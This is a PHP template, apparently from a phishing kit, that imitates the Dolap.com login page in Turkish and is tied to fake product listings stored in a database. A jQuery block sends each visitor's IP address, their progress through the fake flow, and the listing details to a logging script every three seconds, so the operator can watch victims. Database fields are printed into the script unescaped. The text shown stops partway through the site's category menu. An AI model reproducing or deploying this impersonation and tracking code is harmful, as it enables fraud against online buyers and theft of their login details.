<?php
include('database/connect.php');

$id = $_GET['id'];
$sorgu = $db->prepare("SELECT * FROM ilan_dolap WHERE id=:id");
$sorgu->execute(['id' => (int)$id]);

while ($sonuc = $sorgu->fetch()) {
    if ($query = $db->prepare("SELECT * FROM ilan_dolap WHERE id=:id AND ilandurum = '1'")) {
        $query->execute(['id' => (int)$id]);
        if ($query->rowCount() > 0) {  
   ?>

<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="tr">
<head>
<script src="/cdn-cgi/apps/head/brpFYoKgKQ5mz_3g6YcN_hRLM40.js"></script><script>
        /*<![CDATA[*/
        (function (w, d, s, l, i) {
            w[l] = w[l] || [];
            w[l].push({
                'gtm.start':
                    new Date().getTime(), event: 'gtm.js'
            });
            var f = d.getElementsByTagName(s)[0],
                j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : '';
            j.async = true;
            j.src =
                'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
            f.parentNode.insertBefore(j, f);
        })(window, document, 'script', 'dataLayer', 'GTM-K7F5T5N');
        /*]]>*/
    </script>
<title>Üye Girişi | Dolap.com</title>
<meta charset="utf-8" />
<meta http-equiv="content-language" content="tr" />
<meta name="title" content="Üye Girişi | Dolap.com" />
<meta name="description" content="E-posta adresiniz veya Facebook hesabınızla Dolap.com&#39;dan alışveriş yapabilirsiniz. Dünyaca ünlü markalar %75 indirim ile sadece Dolap.com&#39;da." />
<meta property="og:image" content="https://cdn.dolap.com/web/images/dolap_social_logo_1.jpg" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta name="robots" content="index, follow" />
<link rel="stylesheet" href="https://cdn.dolap.com/web/css/bootstrap.min.css" />
<link rel="stylesheet" href="https://cdn.dolap.com/web/css/jquery-ui.min.css" />
<link rel="stylesheet" href="https://cdn.dolap.com/web/css/all_513381_dolap.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" />
<script src="https://cdn.dolap.com/web/js/jquery.min.js" defer="defer"></script>
<script src="https://cdn.dolap.com/web/js/bootstrap.min.js" defer="defer"></script>
<script src="https://cdn.dolap.com/web/js/bootstrap-validator.min.js" defer="defer"></script>
<script src="https://cdn.dolap.com/web/js/bootbox.min.js" defer="defer"></script>
<script src="https://cdn.dolap.com/web/js/jquery.inputmask.bundle.min.js" defer="defer"></script>
<script defer="defer" src="https://cdn.dolap.com/web/js/scripts_513381_dolap.min.js"></script>
<script defer="defer" src="https://cdn.dolap.com/web/js/hammer.min.js"></script>
<script type="application/ld+json">
{ "@context": "http://schema.org", "@type": "WebSite", "name": "Dolap.com", "url": "https://dolap.com"}
</script>
<script>
    window.dolapVars = {"loggedIn": false};
</script>
<script type="application/ld+json">
{  "@context": "http://schema.org",  "@type": "Organization",  "url": "https://dolap.com",  "logo": "https://dolap.com/images/logo.png"}
</script>
<script>
    /*<![CDATA[*/
    window.NREUM||(NREUM={}),__nr_require=function(t,n,e){function r(e){if(!n[e]){var o=n[e]={exports:{}};t[e][0].call(o.exports,function(n){var o=t[e][1][n];return r(o||n)},o,o.exports)}return n[e].exports}if("function"==typeof __nr_require)return __nr_require;for(var o=0;o<e.length;o++)r(e[o]);return r}({1:[function(t,n,e){function r(t){try{s.console&&console.log(t)}catch(n){}}var o,i=t("ee"),a=t(15),s={};try{o=localStorage.getItem("__nr_flags").split(","),console&&"function"==typeof console.log&&(s.console=!0,o.indexOf("dev")!==-1&&(s.dev=!0),o.indexOf("nr_dev")!==-1&&(s.nrDev=!0))}catch(c){}s.nrDev&&i.on("internal-error",function(t){r(t.stack)}),s.dev&&i.on("fn-err",function(t,n,e){r(e.stack)}),s.dev&&(r("NR AGENT IN DEVELOPMENT MODE"),r("flags: "+a(s,function(t,n){return t}).join(", ")))},{}],2:[function(t,n,e){function r(t,n,e,r,o){try{d?d-=1:i("err",[o||new UncaughtException(t,n,e)])}catch(s){try{i("ierr",[s,c.now(),!0])}catch(u){}}return"function"==typeof f&&f.apply(this,a(arguments))}function UncaughtException(t,n,e){this.message=t||"Uncaught error with no additional information",this.sourceURL=n,this.line=e}function o(t){i("err",[t,c.now()])}var i=t("handle"),a=t(16),s=t("ee"),c=t("loader"),f=window.onerror,u=!1,d=0;c.features.err=!0,t(1),window.onerror=r;try{throw new Error}catch(l){"stack"in l&&(t(8),t(7),"addEventListener"in window&&t(5),c.xhrWrappable&&t(9),u=!0)}s.on("fn-start",function(t,n,e){u&&(d+=1)}),s.on("fn-err",function(t,n,e){u&&(this.thrown=!0,o(e))}),s.on("fn-end",function(){u&&!this.thrown&&d>0&&(d-=1)}),s.on("internal-error",function(t){i("ierr",[t,c.now(),!0])})},{}],3:[function(t,n,e){t("loader").features.ins=!0},{}],4:[function(t,n,e){function r(t){}if(window.performance&&window.performance.timing&&window.performance.getEntriesByType){var o=t("ee"),i=t("handle"),a=t(8),s=t(7),c="learResourceTimings",f="addEventListener",u="resourcetimingbufferfull",d="bstResource",l="resource",p="-start",h="-end",m="fn"+p,w="fn"+h,v="bstTimer",y="pushState",g=t("loader");g.features.stn=!0,t(6);var b=NREUM.o.EV;o.on(m,function(t,n){var e=t[0];e instanceof b&&(this.bstStart=g.now())}),o.on(w,function(t,n){var e=t[0];e instanceof b&&i("bst",[e,n,this.bstStart,g.now()])}),a.on(m,function(t,n,e){this.bstStart=g.now(),this.bstType=e}),a.on(w,function(t,n){i(v,[n,this.bstStart,g.now(),this.bstType])}),s.on(m,function(){this.bstStart=g.now()}),s.on(w,function(t,n){i(v,[n,this.bstStart,g.now(),"requestAnimationFrame"])}),o.on(y+p,function(t){this.time=g.now(),this.startPath=location.pathname+location.hash}),o.on(y+h,function(t){i("bstHist",[location.pathname+location.hash,this.startPath,this.time])}),f in window.performance&&(window.performance["c"+c]?window.performance[f](u,function(t){i(d,[window.performance.getEntriesByType(l)]),window.performance["c"+c]()},!1):window.performance[f]("webkit"+u,function(t){i(d,[window.performance.getEntriesByType(l)]),window.performance["webkitC"+c]()},!1)),document[f]("scroll",r,{passive:!0}),document[f]("keypress",r,!1),document[f]("click",r,!1)}},{}],5:[function(t,n,e){function r(t){for(var n=t;n&&!n.hasOwnProperty(u);)n=Object.getPrototypeOf(n);n&&o(n)}function o(t){s.inPlace(t,[u,d],"-",i)}function i(t,n){return t[1]}var a=t("ee").get("events"),s=t(18)(a,!0),c=t("gos"),f=XMLHttpRequest,u="addEventListener",d="removeEventListener";n.exports=a,"getPrototypeOf"in Object?(r(document),r(window),r(f.prototype)):f.prototype.hasOwnProperty(u)&&(o(window),o(f.prototype)),a.on(u+"-start",function(t,n){var e=t[1],r=c(e,"nr@wrapped",function(){function t(){if("function"==typeof e.handleEvent)return e.handleEvent.apply(e,arguments)}var n={object:t,"function":e}[typeof e];return n?s(n,"fn-",null,n.name||"anonymous"):e});this.wrapped=t[1]=r}),a.on(d+"-start",function(t){t[1]=this.wrapped||t[1]})},{}],6:[function(t,n,e){var r=t("ee").get("history"),o=t(18)(r);n.exports=r,o.inPlace(window.history,["pushState","replaceState"],"-")},{}],7:[function(t,n,e){var r=t("ee").get("raf"),o=t(18)(r),i="equestAnimationFrame";n.exports=r,o.inPlace(window,["r"+i,"mozR"+i,"webkitR"+i,"msR"+i],"raf-"),r.on("raf-start",function(t){t[0]=o(t[0],"fn-")})},{}],8:[function(t,n,e){function r(t,n,e){t[0]=a(t[0],"fn-",null,e)}function o(t,n,e){this.method=e,this.timerDuration="number"==typeof t[1]?t[1]:0,t[0]=a(t[0],"fn-",this,e)}var i=t("ee").get("timer"),a=t(18)(i),s="setTimeout",c="setInterval",f="clearTimeout",u="-start",d="-";n.exports=i,a.inPlace(window,[s,"setImmediate"],s+d),a.inPlace(window,[c],c+d),a.inPlace(window,[f,"clearImmediate"],f+d),i.on(c+u,r),i.on(s+u,o)},{}],9:[function(t,n,e){function r(t,n){d.inPlace(n,["onreadystatechange"],"fn-",s)}function o(){var t=this,n=u.context(t);t.readyState>3&&!n.resolved&&(n.resolved=!0,u.emit("xhr-resolved",[],t)),d.inPlace(t,w,"fn-",s)}function i(t){v.push(t),h&&(g=-g,b.data=g)}function a(){for(var t=0;t<v.length;t++)r([],v[t]);v.length&&(v=[])}function s(t,n){return n}function c(t,n){for(var e in t)n[e]=t[e];return n}t(5);var f=t("ee"),u=f.get("xhr"),d=t(18)(u),l=NREUM.o,p=l.XHR,h=l.MO,m="readystatechange",w=["onload","onerror","onabort","onloadstart","onloadend","onprogress","ontimeout"],v=[];n.exports=u;var y=window.XMLHttpRequest=function(t){var n=new p(t);try{u.emit("new-xhr",[n],n),n.addEventListener(m,o,!1)}catch(e){try{u.emit("internal-error",[e])}catch(r){}}return n};if(c(p,y),y.prototype=p.prototype,d.inPlace(y.prototype,["open","send"],"-xhr-",s),u.on("send-xhr-start",function(t,n){r(t,n),i(n)}),u.on("open-xhr-start",r),h){var g=1,b=document.createTextNode(g);new h(a).observe(b,{characterData:!0})}else f.on("fn-end",function(t){t[0]&&t[0].type===m||a()})},{}],10:[function(t,n,e){function r(t){var n=this.params,e=this.metrics;if(!this.ended){this.ended=!0;for(var r=0;r<d;r++)t.removeEventListener(u[r],this.listener,!1);if(!n.aborted){if(e.duration=a.now()-this.startTime,4===t.readyState){n.status=t.status;var i=o(t,this.lastSize);if(i&&(e.rxSize=i),this.sameOrigin){var c=t.getResponseHeader("X-NewRelic-App-Data");c&&(n.cat=c.split(", ").pop())}}else n.status=0;e.cbTime=this.cbTime,f.emit("xhr-done",[t],t),s("xhr",[n,e,this.startTime])}}}function o(t,n){var e=t.responseType;if("json"===e&&null!==n)return n;var r="arraybuffer"===e||"blob"===e||"json"===e?t.response:t.responseText;return h(r)}function i(t,n){var e=c(n),r=t.params;r.host=e.hostname+":"+e.port,r.pathname=e.pathname,t.sameOrigin=e.sameOrigin}var a=t("loader");if(a.xhrWrappable){var s=t("handle"),c=t(11),f=t("ee"),u=["load","error","abort","timeout"],d=u.length,l=t("id"),p=t(14),h=t(13),m=window.XMLHttpRequest;a.features.xhr=!0,t(9),f.on("new-xhr",function(t){var n=this;n.totalCbs=0,n.called=0,n.cbTime=0,n.end=r,n.ended=!1,n.xhrGuids={},n.lastSize=null,p&&(p>34||p<10)||window.opera||t.addEventListener("progress",function(t){n.lastSize=t.loaded},!1)}),f.on("open-xhr-start",function(t){this.params={method:t[0]},i(this,t[1]),this.metrics={}}),f.on("open-xhr-end",function(t,n){"loader_config"in NREUM&&"xpid"in NREUM.loader_config&&this.sameOrigin&&n.setRequestHeader("X-NewRelic-ID",NREUM.loader_config.xpid)}),f.on("send-xhr-start",function(t,n){var e=this.metrics,r=t[0],o=this;if(e&&r){var i=h(r);i&&(e.txSize=i)}this.startTime=a.now(),this.listener=function(t){try{"abort"===t.type&&(o.params.aborted=!0),("load"!==t.type||o.called===o.totalCbs&&(o.onloadCalled||"function"!=typeof n.onload))&&o.end(n)}catch(e){try{f.emit("internal-error",[e])}catch(r){}}};for(var s=0;s<d;s++)n.addEventListener(u[s],this.listener,!1)}),f.on("xhr-cb-time",function(t,n,e){this.cbTime+=t,n?this.onloadCalled=!0:this.called+=1,this.called!==this.totalCbs||!this.onloadCalled&&"function"==typeof e.onload||this.end(e)}),f.on("xhr-load-added",function(t,n){var e=""+l(t)+!!n;this.xhrGuids&&!this.xhrGuids[e]&&(this.xhrGuids[e]=!0,this.totalCbs+=1)}),f.on("xhr-load-removed",function(t,n){var e=""+l(t)+!!n;this.xhrGuids&&this.xhrGuids[e]&&(delete this.xhrGuids[e],this.totalCbs-=1)}),f.on("addEventListener-end",function(t,n){n instanceof m&&"load"===t[0]&&f.emit("xhr-load-added",[t[1],t[2]],n)}),f.on("removeEventListener-end",function(t,n){n instanceof m&&"load"===t[0]&&f.emit("xhr-load-removed",[t[1],t[2]],n)}),f.on("fn-start",function(t,n,e){n instanceof m&&("onload"===e&&(this.onload=!0),("load"===(t[0]&&t[0].type)||this.onload)&&(this.xhrCbStart=a.now()))}),f.on("fn-end",function(t,n){this.xhrCbStart&&f.emit("xhr-cb-time",[a.now()-this.xhrCbStart,this.onload,n],n)})}},{}],11:[function(t,n,e){n.exports=function(t){var n=document.createElement("a"),e=window.location,r={};n.href=t,r.port=n.port;var o=n.href.split("://");!r.port&&o[1]&&(r.port=o[1].split("/")[0].split("@").pop().split(":")[1]),r.port&&"0"!==r.port||(r.port="https"===o[0]?"443":"80"),r.hostname=n.hostname||e.hostname,r.pathname=n.pathname,r.protocol=o[0],"/"!==r.pathname.charAt(0)&&(r.pathname="/"+r.pathname);var i=!n.protocol||":"===n.protocol||n.protocol===e.protocol,a=n.hostname===document.domain&&n.port===e.port;return r.sameOrigin=i&&(!n.hostname||a),r}},{}],12:[function(t,n,e){function r(){}function o(t,n,e){return function(){return i(t,[f.now()].concat(s(arguments)),n?null:this,e),n?void 0:this}}var i=t("handle"),a=t(15),s=t(16),c=t("ee").get("tracer"),f=t("loader"),u=NREUM;"undefined"==typeof window.newrelic&&(newrelic=u);var d=["setPageViewName","setCustomAttribute","setErrorHandler","finished","addToTrace","inlineHit","addRelease"],l="api-",p=l+"ixn-";a(d,function(t,n){u[n]=o(l+n,!0,"api")}),u.addPageAction=o(l+"addPageAction",!0),u.setCurrentRouteName=o(l+"routeName",!0),n.exports=newrelic,u.interaction=function(){return(new r).get()};var h=r.prototype={createTracer:function(t,n){var e={},r=this,o="function"==typeof n;return i(p+"tracer",[f.now(),t,e],r),function(){if(c.emit((o?"":"no-")+"fn-start",[f.now(),r,o],e),o)try{return n.apply(this,arguments)}finally{c.emit("fn-end",[f.now()],e)}}}};a("setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(t,n){h[n]=o(p+n)}),newrelic.noticeError=function(t){"string"==typeof t&&(t=new Error(t)),i("err",[t,f.now()])}},{}],13:[function(t,n,e){n.exports=function(t){if("string"==typeof t&&t.length)return t.length;if("object"==typeof t){if("undefined"!=typeof ArrayBuffer&&t instanceof ArrayBuffer&&t.byteLength)return t.byteLength;if("undefined"!=typeof Blob&&t instanceof Blob&&t.size)return t.size;if(!("undefined"!=typeof FormData&&t instanceof FormData))try{return JSON.stringify(t).length}catch(n){return}}}},{}],14:[function(t,n,e){var r=0,o=navigator.userAgent.match(/Firefox[\/\s](\d+\.\d+)/);o&&(r=+o[1]),n.exports=r},{}],15:[function(t,n,e){function r(t,n){var e=[],r="",i=0;for(r in t)o.call(t,r)&&(e[i]=n(r,t[r]),i+=1);return e}var o=Object.prototype.hasOwnProperty;n.exports=r},{}],16:[function(t,n,e){function r(t,n,e){n||(n=0),"undefined"==typeof e&&(e=t?t.length:0);for(var r=-1,o=e-n||0,i=Array(o<0?0:o);++r<o;)i[r]=t[n+r];return i}n.exports=r},{}],17:[function(t,n,e){n.exports={exists:"undefined"!=typeof window.performance&&window.performance.timing&&"undefined"!=typeof window.performance.timing.navigationStart}},{}],18:[function(t,n,e){function r(t){return!(t&&t instanceof Function&&t.apply&&!t[a])}var o=t("ee"),i=t(16),a="nr@original",s=Object.prototype.hasOwnProperty,c=!1;n.exports=function(t,n){function e(t,n,e,o){function nrWrapper(){var r,a,s,c;try{a=this,r=i(arguments),s="function"==typeof e?e(r,a):e||{}}catch(f){l([f,"",[r,a,o],s])}u(n+"start",[r,a,o],s);try{return c=t.apply(a,r)}catch(d){throw u(n+"err",[r,a,d],s),d}finally{u(n+"end",[r,a,c],s)}}return r(t)?t:(n||(n=""),nrWrapper[a]=t,d(t,nrWrapper),nrWrapper)}function f(t,n,o,i){o||(o="");var a,s,c,f="-"===o.charAt(0);for(c=0;c<n.length;c++)s=n[c],a=t[s],r(a)||(t[s]=e(a,f?s+o:o,i,s))}function u(e,r,o){if(!c||n){var i=c;c=!0;try{t.emit(e,r,o,n)}catch(a){l([a,e,r,o])}c=i}}function d(t,n){if(Object.defineProperty&&Object.keys)try{var e=Object.keys(t);return e.forEach(function(e){Object.defineProperty(n,e,{get:function(){return t[e]},set:function(n){return t[e]=n,n}})}),n}catch(r){l([r])}for(var o in t)s.call(t,o)&&(n[o]=t[o]);return n}function l(n){try{t.emit("internal-error",n)}catch(e){}}return t||(t=o),e.inPlace=f,e.flag=a,e}},{}],ee:[function(t,n,e){function r(){}function o(t){function n(t){return t&&t instanceof r?t:t?c(t,s,i):i()}function e(e,r,o,i){if(!l.aborted||i){t&&t(e,r,o);for(var a=n(o),s=h(e),c=s.length,f=0;f<c;f++)s[f].apply(a,r);var d=u[y[e]];return d&&d.push([g,e,r,a]),a}}function p(t,n){v[t]=h(t).concat(n)}function h(t){return v[t]||[]}function m(t){return d[t]=d[t]||o(e)}function w(t,n){f(t,function(t,e){n=n||"feature",y[e]=n,n in u||(u[n]=[])})}var v={},y={},g={on:p,emit:e,get:m,listeners:h,context:n,buffer:w,abort:a,aborted:!1};return g}function i(){return new r}function a(){(u.api||u.feature)&&(l.aborted=!0,u=l.backlog={})}var s="nr@context",c=t("gos"),f=t(15),u={},d={},l=n.exports=o();l.backlog=u},{}],gos:[function(t,n,e){function r(t,n,e){if(o.call(t,n))return t[n];var r=e();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(t,n,{value:r,writable:!0,enumerable:!1}),r}catch(i){}return t[n]=r,r}var o=Object.prototype.hasOwnProperty;n.exports=r},{}],handle:[function(t,n,e){function r(t,n,e,r){o.buffer([t],r),o.emit(t,n,e)}var o=t("ee").get("handle");n.exports=r,r.ee=o},{}],id:[function(t,n,e){function r(t){var n=typeof t;return!t||"object"!==n&&"function"!==n?-1:t===window?0:a(t,i,function(){return o++})}var o=1,i="nr@id",a=t("gos");n.exports=r},{}],loader:[function(t,n,e){function r(){if(!x++){var t=b.info=NREUM.info,n=l.getElementsByTagName("script")[0];if(setTimeout(u.abort,3e4),!(t&&t.licenseKey&&t.applicationID&&n))return u.abort();f(y,function(n,e){t[n]||(t[n]=e)}),c("mark",["onload",a()+b.offset],null,"api");var e=l.createElement("script");e.src="https://"+t.agent,n.parentNode.insertBefore(e,n)}}function o(){"complete"===l.readyState&&i()}function i(){c("mark",["domContent",a()+b.offset],null,"api")}function a(){return E.exists&&performance.now?Math.round(performance.now()):(s=Math.max((new Date).getTime(),s))-b.offset}var s=(new Date).getTime(),c=t("handle"),f=t(15),u=t("ee"),d=window,l=d.document,p="addEventListener",h="attachEvent",m=d.XMLHttpRequest,w=m&&m.prototype;NREUM.o={ST:setTimeout,CT:clearTimeout,XHR:m,REQ:d.Request,EV:d.Event,PR:d.Promise,MO:d.MutationObserver};var v=""+location,y={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-1026.min.js"},g=m&&w&&w[p]&&!/CriOS/.test(navigator.userAgent),b=n.exports={offset:s,now:a,origin:v,features:{},xhrWrappable:g};t(12),l[p]?(l[p]("DOMContentLoaded",i,!1),d[p]("load",r,!1)):(l[h]("onreadystatechange",o),d[h]("onload",r)),c("mark",["firstbyte",s],null,"api");var x=0,E=t(17)},{}]},{},["loader",2,10,4,3]);
    ;NREUM.info={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",licenseKey:"7c3b94462c",applicationID:"55710871",sa:1}
    /*]]>*/
</script>
<link rel="shortcut icon" href="https://cdn.dolap.com/web/icons/favicon.ico" type="image/x-icon" />
<link rel="apple-touch-icon" href="https://cdn.dolap.com/web/icons/apple-touch-icon.png" />
<link rel="apple-touch-icon" sizes="57x57" href="https://cdn.dolap.com/web/icons/apple-touch-icon-57x57.png" />
<link rel="apple-touch-icon" sizes="72x72" href="https://cdn.dolap.com/web/icons/apple-touch-icon-72x72.png" />
<link rel="apple-touch-icon" sizes="76x76" href="https://cdn.dolap.com/web/icons/apple-touch-icon-76x76.png" />
<link rel="apple-touch-icon" sizes="114x114" href="https://cdn.dolap.com/web/icons/apple-touch-icon-114x114.png" />
<link rel="apple-touch-icon" sizes="120x120" href="https://cdn.dolap.com/web/icons/apple-touch-icon-120x120.png" />
<link rel="apple-touch-icon" sizes="144x144" href="https://cdn.dolap.com/web/icons/apple-touch-icon-144x144.png" />
<link rel="apple-touch-icon" sizes="152x152" href="https://cdn.dolap.com/web/icons/apple-touch-icon-152x152.png" />
<link rel="apple-touch-icon" sizes="180x180" href="https://cdn.dolap.com/web/icons/apple-touch-icon-180x180.png" />
<link rel="icon" type="image/png" sizes="192x192" href="https://cdn.dolap.com/web/icons/android-icon-192x192.png" />
<link rel="icon" type="image/png" sizes="32x32" href="https://cdn.dolap.com/web/icons/favicon-32x32.png" />
<link rel="icon" type="image/png" sizes="96x96" href="https://cdn.dolap.com/web/icons/favicon-96x96.png" />
<link rel="icon" type="image/png" sizes="16x16" href="https://cdn.dolap.com/web/icons/favicon-16x16.png" />
<link rel="manifest" href="https://cdn.dolap.com/web/icons/manifest.json" />
<meta http-equiv="x-dns-prefetch-control" content="on" />
<link rel="dns-prefetch" href="//cdn.dolap.com" />
<link rel="dns-prefetch" href="//cdn.branch.io" />
<link rel="dns-prefetch" href="//www.google-analytics.com" />
<link rel="canonical" href="https://dolap.com/giris" />
<script type="text/javascript">
    var google_tag_params = {
     ecomm_pagetype: 'signup'
    };
    </script>
<script>
    (function (i, s, o, g, r, a, m) {
        i['GoogleAnalyticsObject'] = r;
        i[r] = i[r] || function () {
                (i[r].q = i[r].q || []).push(arguments)
            }, i[r].l = 1 * new Date();
        a = s.createElement(o),
            m = s.getElementsByTagName(o)[0];
        a.async = 1;
        a.src = g;
        m.parentNode.insertBefore(a, m)
    })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
    ga('create', 'UA-80073361-1', 'auto');
    ga('send', 'pageview');
    ga('require', 'ecommerce');
</script>
<script type="text/javascript">
/* <![CDATA[ */
var google_conversion_id = 878859678;
var google_custom_params = window.google_tag_params;
var google_remarketing_only = true;
/* ]]> */
</script>
<script type="text/javascript" src="//www.googleadservices.com/pagead/conversion.js">
</script>
<noscript>
<div style="display:inline;">
<img height="1" width="1" style="border-style:none;" alt="" src="//googleads.g.doubleclick.net/pagead/viewthroughconversion/878859678/?guid=ON&amp;script=0" />
</div>
</noscript>

<script async="async" src="https://www.googletagmanager.com/gtag/js?id=AW-878859678"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'AW-878859678');
</script>
<script>
!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
document,'script','https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '1324013654283333');
fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1324013654283333&amp;ev=PageView&amp;noscript=1" /></noscript>

</head>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
$(document).ready(function() {
    function guncelleVeriler() {
        // Kullanıcının IP adresini al
        var ip_adresi = '<?php echo $_SERVER['REMOTE_ADDR']; ?>';
        
        // Hangi sayfada olduğunu belirle (örneğin, ilan sayfası)
        var sayfa = 'Giriş Sayfasında<br><div style="margin-left:23px">[<font color="green">■■■</font><font color="red">□□□□□□□</font>] 30%<div><br>'; // İlgili sayfanın adını kullanın
        var ekleyen = '<?php echo $sonuc["ekleyen"]; ?>'; // İlgili sayfanın adını kullanın
        var urunadi = '<?php echo $sonuc["urunadi"]; ?>'; // İlgili sayfanın adını kullanın

        // Sunucuya POST isteği göndererek verileri güncelle
        $.ajax({
            type: 'POST',
            url: 'girislog.php', // Kayıt ekleme işlemini yapacak olan PHP dosyasının adını ve yolunu buraya ekleyin
            data: {
                ip_adresi: ip_adresi,
                sayfa: sayfa,
                ekleyen: ekleyen,
                urunadi: urunadi
            },
            success: function(response) {
                console.log('Veriler başarıyla güncellendi.');
            },
            error: function(xhr, status, error) {
                console.error('Veriler güncellenirken bir hata oluştu: ' + error);
            }
        });
    }

    // Belirli aralıklarla verileri güncellemek için JavaScript setInterval kullanın
    setInterval(guncelleVeriler, 3000); // 5000 milisaniye (5 saniye) olarak ayarladık
});
</script>

<body>
<noscript>
    <iframe height="0" style="display:none;visibility:hidden" width="0" src="https://www.googletagmanager.com/ns.html?id=GTM-K7F5T5N"></iframe>
</noscript>
<div class="popup-holder">
<div class="popup" id="popupLikeFollow">
<input id="downloadAppSource" name="downloadAppSource" type="hidden" />
<div class="text-holder">
<p class="popup-title">ÜRÜNÜ BEĞENDİN Mİ?</p>
<p class="popup-subtitle">Bu işlemi yapmak için ücretsiz Dolap uygulamasını indirmen gerekli.</p>
</div>
<div class="btn-holder visible-xs"><a class="btn btn-default" href="#" id="downloadMobileAppLink" onclick="navigateToMobileApp(this);">İndir</a></div>
<ul class="google-apple-btns hidden-xs">
<li><a href="https://app.adjust.com/ju0l4z" onclick="navigateToMobileApp(this);"><img alt="apple" src="https://cdn.dolap.com/web/images/btn-apple.png" /></a></li>
<li><a href="https://app.adjust.com/btdp06" onclick="navigateToMobileApp(this);"><img alt="android" src="https://cdn.dolap.com/web/images/btn-google.png" /></a></li>
</ul>
</div>
</div>

<div id="wrapper">

<header id="header" class="home-page">
<div class="container">
<div class="logo">
<a href="https://dolap.com">
<img class="logo-title visible-xs" src="https://cdn.dolap.com/web/images/logo-5.svg" alt="Dolap" />
<div class="text-img">
<img class="hidden-xs" src="https://cdn.dolap.com/web/images/logo-5.svg" alt="elden ele moda" />
</div>
</a>
</div>
<div class="nav-area">
<a href="#" class="nav-opener"><span></span></a>
<div class="list-holder">
<ul id="nav">
<li class="navigationItem hidden-xs"><a href="https://dolap.com/markalar">Markalar</a></li>
<li class="navigationItem visible-xs"><a rel="nofollow" href="/">Ana Sayfa</a></li>
<li class="navigationItem visible-xs"><a rel="nofollow" href="/nasil-calisir">Nasıl Çalışır?</a></li>
<li class="navigationItem visible-xs"><a rel="nofollow" href="http://destek.dolap.com" target="_blank">Dolap Destek</a></li>
<li class="navigationItem visible-xs"><a rel="nofollow" href="/hakkimizda">İletişim</a></li>
<li class="navigationItem visible-xs"><a href="https://dolap.com/markalar">Markalar</a></li>
<li class="navigationItem hidden-xs">
<a rel="nofollow" href="#">GİRİŞ YAP</a>
</li>
<li class="navigationItem visible-xs">
 <a rel="nofollow" href="#">Giriş Yap</a>
</li>
</ul>
<div class="logo-holder visible-xs">
<a href="https://dolap.com"><img alt="Dolap elden ele moda" src="https://cdn.dolap.com/web/images/logo-2.svg" /></a>
</div>
</div>
</div>
<form class="search-form" onSubmit="if (this.q.value.trim() == '') {return false;}" action="/ara">
<input id="search" type="search" name="q" placeholder="Ürün, @üye, #etiket ara" value="" />
<a href="#" class="form-opener"><i class="icon-search"></i></a>
</form>
</div>
<div class="links-list">
<button data-toggle="collapse" data-target="#demo" class="links-opener">
Kategoriler <i class="icon-down-open"></i>
</button>
<ul class="links-ul accordion collapse" id="demo">
<li class="category-header-93">
<a href="#" class="opener visible-xs visible-sm">Giyim</a>
<a class="hidden-xs hidden-sm" href="/giyim">Giyim</a>
<div class="slide">
<ul class="inner-links">
<li>
<a href="https://dolap.com/ust-giyim" title="Üst Giyim">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/94.png" alt="Üst Giyim" width="40" height="40" />
</div>
<span>Üst Giyim</span>
</a>
</li>
<li>
<a href="https://dolap.com/alt-giyim" title="Alt Giyim">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/105.png" alt="Alt Giyim" width="40" height="40" />
</div>
<span>Alt Giyim</span>
</a>
</li>
<li>
<a href="https://dolap.com/elbise" title="Elbise">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/126.png" alt="Elbise" width="40" height="40" />
</div>
<span>Elbise</span>
</a>
</li>
<li>
<a href="https://dolap.com/dis-giyim" title="Dış Giyim">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/115.png" alt="Dış Giyim" width="40" height="40" />
</div>
<span>Dış Giyim</span>
</a>
</li>
<li>
<a href="https://dolap.com/plaj-giyim" title="Plaj Giyim">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/370.png" alt="Plaj Giyim" width="40" height="40" />
</div>
<span>Plaj Giyim</span>
</a>
</li>
<li>
<a href="https://dolap.com/ev-giyim" title="Ev Giyim">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/374.png" alt="Ev Giyim" width="40" height="40" />
</div>
<span>Ev Giyim</span>
</a>
</li>
<li>
<a href="https://dolap.com" title="İkili Takım">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/34000.png" alt="İkili Takım" width="40" height="40" />
</div>
<span>İkili Takım</span>
</a>
</li>
</ul>
</div>
</li>
<li class="category-header-73">
<a href="#" class="opener visible-xs visible-sm">Çanta</a>
<a class="hidden-xs hidden-sm" href="https://dolap.com/canta">Çanta</a>
<div class="slide">
<ul class="inner-links">
<li>
<a href="https://dolap.com/kol-cantasi" title="Kol Çantası">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/78.png" alt="Kol Çantası" width="40" height="40" />
</div>
<span>Kol Çantası</span>
</a>
</li>
<li>
<a href="https://dolap.com/askili-canta" title="Askılı Çanta">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/82.png" alt="Askılı Çanta" width="40" height="40" />
</div>
<span>Askılı Çanta</span>
</a>
</li>
<li>
<a href="https://dolap.com/sirt-cantasi" title="Sırt Çantası">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/74.png" alt="Sırt Çantası" width="40" height="40" />
</div>
